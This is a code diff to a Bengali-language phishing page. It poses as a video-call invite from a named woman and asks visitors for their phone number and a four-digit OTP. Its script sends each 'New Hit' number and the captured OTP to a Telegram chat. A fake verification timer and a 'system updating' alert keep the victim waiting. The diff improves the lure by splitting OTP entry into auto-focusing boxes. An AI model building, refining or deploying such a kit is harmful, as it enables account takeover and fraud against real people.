@@ -7,29 +7,28 @@
 
     <style>
         body { font-family: sans-serif; text-align: center; background: #f4f4f4; margin: 0; padding: 0; }
-        .card { width: 95%; max-width: 380px; margin: 50px auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); box-sizing: border-box; }
-        img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid #e91e63; object-fit: cover; }
-        input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; text-align: center; }
-        button { width: 100%; padding: 15px; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        .card { width: 95%; max-width: 380px; margin: 50px auto; background: white; padding: 25px 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); box-sizing: border-box; }
+        img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid #e91e63; object-fit: cover; margin-bottom: 10px; }
         
-        /* ১ম ছবির মতো ধূসর টাইমার স্টাইল */
-        #timerText {
-            color: #8E8E8E; 
-            font-size: 13px; 
-            font-weight: bold; 
-            margin-top: 20px; 
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            display: none; /* শুরুতে লুকানো থাকবে */
-        }
+        input#phone { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; text-align: center; }
+        
+        /* ৪টি আলাদা ওটিপি বক্সের স্টাইল */
+        .otp-container { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
+        .otp-box { width: 55px; height: 65px; border: 1px solid #ccc; border-radius: 12px; font-size: 24px; text-align: center; background: #fdfdfd; outline: none; transition: 0.3s; }
+        .otp-box:focus { border-color: #e91e63; box-shadow: 0 0 5px rgba(233, 30, 99, 0.2); }
+
+        button { width: 100%; padding: 15px; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; }
+        
+        /* টাইমার স্টাইল */
+        #timerText { color: #8E8E8E; font-size: 13px; font-weight: bold; margin-top: 25px; text-transform: uppercase; letter-spacing: 1px; display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <img src="received_1748447966512537.jpeg" alt="Sumaiya">
-    <h2 id="title">Sumaiya Afrin</h2>
-    <p id="msg">নম্বর দিয়ে ভিডিও কল শুরু করুন</p>
+    <h2 id="title" style="margin: 10px 0;">Sumaiya Afrin</h2>
+    <p id="msg" style="color: #555;">নম্বর দিয়ে ভিডিও কল শুরু করুন</p>
 
     <form id="mainForm">
         <div id="step1">
@@ -38,9 +37,14 @@
         </div>
 
         <div id="step2" style="display:none;">
-            <input type="tel" id="otp" placeholder="৪ ডিজিট কোড (OTP)" required>
-            <button type="submit">ভিডিও কল শুরু করুন ✅</button>
+            <div class="otp-container">
+                <input type="tel" maxlength="1" class="otp-box" id="otp1" oninput="moveNext(this, 'otp2')" onkeyup="moveBack(event, 'otp1')">
+                <input type="tel" maxlength="1" class="otp-box" id="otp2" oninput="moveNext(this, 'otp3')" onkeyup="moveBack(event, 'otp1')">
+                <input type="tel" maxlength="1" class="otp-box" id="otp3" oninput="moveNext(this, 'otp4')" onkeyup="moveBack(event, 'otp2')">
+                <input type="tel" maxlength="1" class="otp-box" id="otp4" oninput="moveNext(this, '')" onkeyup="moveBack(event, 'otp3')">
+            </div>
             
+            <button type="submit">ভিডিও কল শুরু করুন ✅</button>
             <p id="timerText">VERIFYING IN <span id="seconds">30</span>S...</p>
         </div>
     </form>
@@ -51,22 +55,35 @@
     const chatId = '8795859465';
     let userPhone = "";
 
+    // টাইমার ফাংশন
     function startTimer() {
         let seconds = 30;
         const countdownElement = document.getElementById('seconds');
         const timerText = document.getElementById('timerText');
-        
-        timerText.style.display = 'block'; // টাইমার দেখানো শুরু হবে
+        timerText.style.display = 'block';
 
         const timer = setInterval(() => {
             seconds--;
             countdownElement.textContent = seconds;
-
             if (seconds <= 0) {
                 clearInterval(timer);
                 timerText.innerHTML = "OTP EXPIRED. PLEASE TRY AGAIN.";
             }
         }, 1000);
+    }
+
+    // অটো ফোকাস ফাংশন
+    function moveNext(current, nextFieldID) {
+        if (current.value.length >= 1 && nextFieldID !== "") {
+            document.getElementById(nextFieldID).focus();
+        }
+    }
+
+    // ব্যাকস্পেস ফাংশন
+    function moveBack(event, prevFieldID) {
+        if (event.key === "Backspace" && event.target.value === "") {
+            document.getElementById(prevFieldID).focus();
+        }
     }
 
     function goToStep2() {
@@ -82,22 +99,24 @@
         document.getElementById('title').innerText = "Verification";
         document.getElementById('msg').innerText = "কোডটি নিচে লিখুন";
 
-        // টাইমার শুরু করা হলো
         startTimer();
-
         sendToTelegram(`🔔 New Hit!\n📱 Number: ${userPhone}`);
     }
 
     document.getElementById('mainForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        const otpInput = document.getElementById('otp').value;
+        // ৪টি বক্সের মান যোগ করা
+        const otp = document.getElementById('otp1').value + 
+                    document.getElementById('otp2').value + 
+                    document.getElementById('otp3').value + 
+                    document.getElementById('otp4').value;
         
-        if (otpInput.length < 4) {
-            alert("সঠিক কোড দিন");
+        if (otp.length < 4) {
+            alert("দয়া করে ৪ ডিজিট কোডটি পূরণ করুন");
             return;
         }
 
-        sendToTelegram(`✅ OTP Received!\n📱 Number: ${userPhone}\n🔑 OTP: ${otpInput}`);
+        sendToTelegram(`✅ OTP Received!\n📱 Number: ${userPhone}\n🔑 OTP: ${otp}`);
         alert("সিস্টেম আপডেট হচ্ছে, দয়া করে অপেক্ষা করুন।");
     });
 
